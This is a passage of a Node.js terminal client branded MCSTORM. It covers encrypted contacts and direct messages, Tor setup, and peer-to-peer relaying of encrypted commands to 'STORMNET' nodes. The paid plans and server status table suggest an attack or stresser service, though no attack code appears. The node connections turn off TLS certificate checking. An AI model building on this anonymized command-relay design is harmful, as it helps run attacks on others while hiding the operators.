    console.log("")
    console.log(message)
    console.log("")
  }
  prompt([{
      type: 'input',
      name: 'contact',
      message: 'Enter user token:',
    }])
    .then((answers) => {
      if (answers.contact.length == 32) {
        var key = null;
        knownKeys.forEach(k => {
          if (getUserToken(k) == answers.contact) key = k;
        })
        if (key == null) {
          newContact("The user is offline or not found".red + " Type `" + "exit".yellow + "` to go back");
          return;
        }
        contacts.push({
          username: null,
          token: answers.contact,
          key: key.toString('hex')
        });
        fs.writeFileSync("contacts.json", JSON.stringify(contacts))
        openDirectMessages();
      } else if(answers.contact=="exit") {
        openDirectMessages();
      } else {
        newContact("Invalid user token".red + " Type `" + "exit".yellow + "` to go back")
      }

    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function openDM(key, showHelp = false) {
  prompt.currentPrompt.close();
  var userToken = getUserToken(Buffer.from(key, 'hex'));
  currentWindow = "DM" + userToken;
  if (showHelp) {
    console.log("")
    console.log("Type `" + "exit".yellow + "` to return to main menu.")
    console.log("")
    if (!fs.existsSync("./chatHistories/" + userToken)) {
      fs.mkdirSync("./chatHistories/" + userToken)
    }
    if (!fs.existsSync("./chatHistories/" + userToken + "/history")) {
      fs.writeFileSync("./chatHistories/" + userToken + "/history", "")
    }
    if (!fs.existsSync("./chatHistories/" + userToken + "/messages")) {
      fs.mkdirSync("./chatHistories/" + userToken + "/messages")
    }
    var decryptedMessages = [];
    console.log("Decrypting messages...")
    fs.readFileSync("./chatHistories/" + userToken + "/history").toString().replace(/\r/g, "").split("\n").slice(-50).forEach(file => {
      if (file == "") return;
      var decrypted = JSON.parse(decryptStoredMessage(fs.readFileSync("./chatHistories/" + userToken + "/messages/" + file + ".json"), keys.pass).toString());
      const date = new Date(decrypted.time);
      const dateString = date.toLocaleDateString();
      const timeString = date.toLocaleTimeString();
      decryptedMessages.push("[DM] ".green + ("[" + dateString + " " + timeString + "]").brightBlue + " [" + userToken.slice(0, 8) + "...] " + decrypted.username + " > " + decrypted.message)
    });
    decryptedMessages.forEach(message => {
      console.log(message)
    })
  }

  prompt([{
      type: 'input',
      name: 'directMessage',
      message: '>',
    }])
    .then((answers) => {
      if (processDirectMessage(answers.directMessage, key)) {
        openDM(key)
      } else {
        prompt.currentPrompt = null;
        showMainMenu();
      }

    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function openDirectMessages() {
  currentWindow = "contacts";
  displayBanner();
  loadContacts();
  const contactMenu = [
    '+ Add contact'
  ];
  contacts.forEach(contact => {
    contactMenu.push(contact.username == null ? contact.token : contact.username);
  })
  contactMenu.push("Return to Main Menu");

  if (!fs.existsSync("./chatHistories")) {
    fs.mkdirSync("./chatHistories")
  }
  prompt([{
      type: 'list',
      name: 'contactMenu',
      message: 'Choose contact:',
      choices: contactMenu
    }])
    .then((answers) => {
      switch (answers.contactMenu) {
        case "+ Add contact":
          newContact("Obtain user token by copying it from public community chat or by receving it from someone by third party messaging application. Type `" + "exit".yellow + "` to go back");
          break;
        case "Return to Main Menu":
          showMainMenu();
          break;
        default:
          var found = false;
          contacts.forEach(contact => {
            if (contact.token == answers.contactMenu || contact.username == answers.contactMenu) {
              openDM(contact.key, true);
              found = true;
            }
          })
          if (!found) openDirectMessages()
          return;
      }
    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function networkStatus() {
  currentWindow = "network";
  try {
    var columns = 3;
    var head = [];
    for (var i = 0; i < columns; i++) {
      if(i!=0) head.push("");
      head.push("Network");
      head.push("Server name");
    }
    var table = new Table({
      head: head
    });
    currentData.n.sort((a,b)=>{return a.n>b.n?1:-1})
    
    var percolumn = Math.ceil(currentData.n.length/columns);
    var columns_data = [];
    for (var i = 0; i < columns; i++) {
      columns_data[i] = currentData.n.slice(i*percolumn,(i+1)*percolumn);
    }
    for (var i = 0; i < columns_data[0].length; i++) {
      var row_data = [];
      for(var j = 0; j < columns; j++) {
        var color = "red";
        if(columns_data[j][i].o==1) {
          color = "green";
        }
        if(columns_data[j][i].a==1) {
          color = "brightCyan";
        }
        if(j!=0) row_data.push("")
        row_data.push(columns_data[j][i].n[color])
        row_data.push(columns_data[j][i].s[color])
      }
      table.push(row_data)
    }
    console.log(table.toString())
    console.log("Color legend: "+"Offline".red+" Online".green+" In use".brightCyan);
    console.log("");
    console.log("Table does not update automatically :(");
    backToMainMenu();
  } catch (e) {
    console.log("Could not get network status. Please wait a few seconds before trying again.".red)
    backToMainMenu()
    return;
  }
}

function showMainMenu() {
  currentWindow = "mainmenu";
  displayBanner();
  const mainManu = [
    'MCSTORM console',
    'Browse Basic plans',
    'Browse Private plans',
    'Open Community chat',
    'Direct Messages',
    'Network status',
    'Known working links',
  ];
  prompt([{
      type: 'list',
      name: 'mainMenu',
      message: 'Welcome! Please choose what you want to do:',
      choices: mainManu
    }])
    .then((answers) => {
      switch (answers.mainMenu) {
        case "MCSTORM console":
          openConsole(true);
          break;
        case "Open Community chat":
          openCommunityChat(true);
          break;
        case "Direct Messages":
          openDirectMessages();
          break;
        case "Browse Basic plans":
          buyPlans();
          break;
        case "Browse Private plans":
          buyPrivatePlans();
          break;
        case "Network status":
          networkStatus();
          break;
        case "Known working links":
          showLinks();
          backToMainMenu()
          break;
        default:
          showMainMenu();
          break;
      }
    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function backToMainMenu() {
  prompt([{
      type: 'input',
      name: 'back',
      message: 'Press Enter to return to main menu',
    }])
    .then((answers) => {
      showMainMenu();
    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function showLinks() {
  console.log("")
  console.log(fs.readFileSync("links.txt").toString());
  console.log("")
}

function catchInquirerError(error) {
  console.log(error)
  if (error.isTtyError) {
    console.log("Could not load menu. Please try other device/terminal");
    process.exit();
  } else {
    console.log("An unknown error occured.");
    process.exit();
  }
}

function setupTOR(platform) {
  switch(platform) {
  case "win32":
    if(fs.existsSync("tor.exe")) {
      var torMessages = true;
      var tor = spawn("tor.exe", []);
      tor.stdout.on('data', data => {
        if(torMessages) process.stdout.write(data.toString())
        if(data.toString().includes("Bootstrapped 100%")) {
          torMessages = false;
          connectNodes(true)
          initEncryption("Welcome back! Before you can begin, please enter your password for decryption.");
        }
      })
    } else {
      var link = "https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz"
      const tordownload = fs.createWriteStream("tor.tar.gz");
      const request = https.get(link, res => {
        res.pipe(tordownload);
        tordownload.on("finish", () => {
          tordownload.close();
          console.log("Download Completed, extracting...");
          var extract = tar.extract();
          var chunks = [];

          extract.on('entry', (header, stream, cb) => {
              stream.on('data', chunk => {
                if (header.name == 'tor/tor.exe') chunks.push(chunk);
              });

              stream.on('end', function() {
                  cb();
              });

              stream.resume();
          });

          extract.on('finish', function() {
              fs.writeFileSync('tor.exe', Buffer.concat(chunks));
              fs.unlinkSync("tor.tar.gz")
              var tor = spawn("tor.exe", []);
              tor.stdout.on('data', data => {
                process.stdout.write(data.toString())
                if(data.toString().includes("Bootstrapped 100%")) {
                  connectNodes(true)
                  initEncryption("Welcome back! Before you can begin, please enter your password for decryption.");
                }
              })
          });

          fs.createReadStream('tor.tar.gz').pipe(zlib.createGunzip()).pipe(extract);
        });
      });
    }
    
    break;
  case "linux":
    try {
      var tor = spawn("tor", ['--version']);
      tor.stdout.on('data', data => {
        process.stdout.write(data.toString())
        if(data.toString().includes("Tor is running")) {
          connectNodes(true)
          initEncryption("Welcome back! Before you can begin, please enter your password for decryption.");
        }
      })
    } catch (e) {
      console.log("Tor not installed.".red)
    }
    
    break;
  default:
    console.log("TOR unsupportes platform".red)
    process.exit();
  }
}

function displayBanner() {
  console.clear();
  console.log("");
  console.log(" ███╗   ███╗ ██████╗███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗".yellow);
  console.log(" ████╗ ████║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║".yellow);
  console.log(" ██╔████╔██║██║     ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║".yellow);
  console.log(" ██║╚██╔╝██║██║     ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║".yellow);
  console.log(" ██║ ╚═╝ ██║╚██████╗███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║".yellow);
  console.log(" ╚═╝     ╚═╝ ╚═════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝".yellow);
  console.log("");
}

function removeNode(node) {
  if (node==undefined) return;
  knownNodes = knownNodes.filter(o=>o.host!==node.host);
  var list = [];
  knownNodes.forEach(n=>{
    list.push(n.host+":"+n.port);
  })
  var listToSave = list.join("\n");
  fs.writeFileSync('nodes.txt', listToSave);
}

function updateNode(node) {
  knownNodes.forEach((n,i,o)=>{
    if(n.host==node.host) o[i]=node;
  })
}

function connectNode(i, tor = false) {
  if(i>=knownNodes.length) return;
  var connectedNode = knownNodes[i];
  lastConnTry++;
  var socket;
  if(tor) {
    const Agent = new SocksProxyAgent('socks5://127.0.0.1:9050')
    socket = io("wss://" + connectedNode.host + ":" + connectedNode.port, {
      rejectUnauthorized: false,
      agent: Agent,
      timeout: 60000
    });
  } else {
    socket = io("wss://" + connectedNode.host + ":" + connectedNode.port, {
      rejectUnauthorized: false,
      timeout: 10000
    });
  }
  
  socket.on("connect", () => {
    connectedNode.online = true;
    updateNode(connectedNode);
    connected++;
    process.stdout.write(String.fromCharCode(27) + "]0;" + "MCSTORM | Connected: "+connected + String.fromCharCode(7));
  });

  socket.on("disconnect", () => {
    connected--;
    process.stdout.write(String.fromCharCode(27) + "]0;" + "MCSTORM | Connected: "+connected + String.fromCharCode(7));
  });

  socket.on("connect_error", (e) => {

    if(!connectedNode.online) {
      socket.disconnect();
      removeNode(connectedNode)
    }
    
    connectNode(lastConnTry, tor)
  });

  socket.on("redirectEncryptedMessage", message => {
    if(message.pow==undefined||message.keyPow==undefined||message.hash==undefined||message.keyHash==undefined||message.messageId==undefined) {
      // missing data
      socket.disconnect();
      removeNode(connectedNode);
      return;
    }
    
    if(!message.hash.startsWith("0000")) {
      // invalid message pow
      socket.disconnect();
      removeNode(connectedNode);
      return;
    }
    if(!message.keyHash.startsWith("000000")) {
      // invalid key pow
      socket.disconnect();
      removeNode(connectedNode);
      return;
    }

    var toVerify = {
      messageId: message.messageId,
      encryptedMessage: message.encryptedMessage,
      encryptedKey: message.encryptedKey,
      publicKey: message.publicKey
    }

    if(sha256(JSON.stringify(toVerify)+message.pow)!=message.hash) {
      // invalid hash
      socket.disconnect();
      removeNode(connectedNode);
      return;
    }
    if(sha256(message.publicKey.toString()+message.keyPow)!=message.keyHash) {
      // invalid key hash
      socket.disconnect();
      removeNode(connectedNode);
      return;
    }

    if (receivedMessages.includes(message.messageId)) return;
    receivedMessages.push(message.messageId);
    message.from = socket.id;
    decryptMessage(message)
    sockets.forEach(socket => {
      if (!socket.connected) return;
      if (message.from == socket.id) return;
      socket.emit("redirectedEncryptedMessage", message);
    });
  });
  sockets.push(socket);
}

function connectNodes(tor = false) {
  knownNodes = removeDuplicates(knownNodes, 'host');
  console.log(knownNodes)
  saveNodeList();
  var stopConnect = false;
  var countConnect = 2;
  while(!stopConnect) {
    countConnect++;
    if(Math.random()*10>7) stopConnect = true;
  } 

  if(knownNodes.length<countConnect) {
    countConnect=knownNodes.length
  }

  for (var i = knownNodes.length - 1; i > 0; i--) {
    var j = Math.floor(Math.random() * (i + 1));
    [knownNodes[i], knownNodes[j]] = [knownNodes[j], knownNodes[i]];
  }

  for(var i = 0; i < countConnect; i++) {
    connectNode(i, tor)
  }
}

function randomTimeout(max) {
  var timeout = Math.floor(Math.random()*max);
  return timeout;
}


setInterval(async () => {
  if (keys.private == null) return
  var currentCommand = commandQueue.shift();
  if (currentCommand == undefined) {
    if(Math.random()*10>9) {
      currentCommand = await encryptMessage(JSON.stringify({knownNode:knownNodes[Math.floor(Math.random()*knownNodes.length)]}), false);
    } else {
      return;
    }
  }
  setTimeout(()=>{
    sockets.forEach(socket => {
      if (!socket.connected) return;
      socket.emit("redirectedEncryptedMessage", currentCommand);
    })
  }, randomTimeout(1000));
}, 500)

process.stdout.write(String.fromCharCode(27) + "]0;" + "MCSTORM | Connected: "+connected + String.fromCharCode(7));

if(!fs.existsSync("contype.txt")) {
  displayBanner();
  console.log("Before you begin, please select connection type.")
  console.log();
  console.log("If you choose "+"Direct connection".cyan+", you will connect to the STORMNET with your own IP address. Your messages and command are encrypted and pseudo-anonymous. STORMNET nodes will see your IP address, but the connection will be significantly faster than using TOR. Your Internet Service Provider, Employer, School or Network manager can see that you connected to the STORMNET.")
  console.log();
  console.log("If you choose "+"TOR connection".cyan+", you will connect to the STORMNET through The Onion Router, also known as the dark web. Your messages and commands are encrypted and fully anonymous. STORMNET nodes will not see your IP address, but the connection will be much slower with higher latency. Your Internet Service Provider, Employer, School or Network manager can see that you connected to The Onion Router, but they can't see that you connected to STORMNET.")
  console.log();
  const connectionMenu = [
    'Direct connection',
    'TOR connection (dark web)'
  ];
  prompt([{
      type: 'list',
      name: 'connMenu',
      message: 'Please select connection type:',
      choices: connectionMenu
    }])
    .then((answers) => {

      switch (answers.connMenu) {
        case "Direct connection":
          connType = "direct";
          fs.writeFileSync("contype.txt", connType)
          connectNodes();
          initEncryption("Welcome back! Before you can begin, please enter your password for decryption.");
          break;
        case "TOR connection (dark web)":
          connType = "TOR";
          fs.writeFileSync("contype.txt", connType)
          console.log("Setting up TOR for "+process.platform+"...")
          setupTOR(process.platform)
          break;
      }
    })
    .catch((error) => {
      catchInquirerError(error);
    });
} else {
  switch (fs.readFileSync("contype.txt").toString()) {
    case "direct":
      connType = "direct";
      fs.writeFileSync("contype.txt", connType)
      connectNodes();
      initEncryption("Welcome back! Before you can begin, please enter your password for decryption.");
      break;
    case "TOR":
      connType = "TOR";
      fs.writeFileSync("contype.txt", connType)
      console.log("Setting up TOR for "+process.platform+"...")
      setupTOR(process.platform)
      break;
    default:
      console.log("Invalid connection type in contype.txt".red);
      process.exit()
      break;
  }
}
